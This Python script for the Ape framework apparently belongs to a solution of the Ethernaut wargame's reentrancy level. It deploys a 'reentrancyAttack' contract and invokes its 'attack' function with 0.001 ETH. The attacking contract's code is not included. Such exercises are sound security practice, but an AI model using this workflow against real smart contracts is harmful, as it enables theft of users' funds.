from ape import project, accounts, convert


def deploy():
    account = accounts.load("ethernaut")
    contract = account.deploy(
        project.reentrancyAttack,
        max_priority_fee="0.5 gwei",
        max_fee="1 gwei",
        sender=account,
        publish=True,
    )
    return contract


def sent_tx():
    account = accounts.load("ethernaut")
    contract = project.reentrancyAttack.at("0xb24c8D2c362f64e116EDD9fB272343501700D9b1")

    contract.invoke_transaction(
        "attack",
        value=convert("0.001 eth", int),
        max_priority_fee="1 gwei",
        max_fee="2 gwei",
        sender=account,
    )


def main():
    deploy()
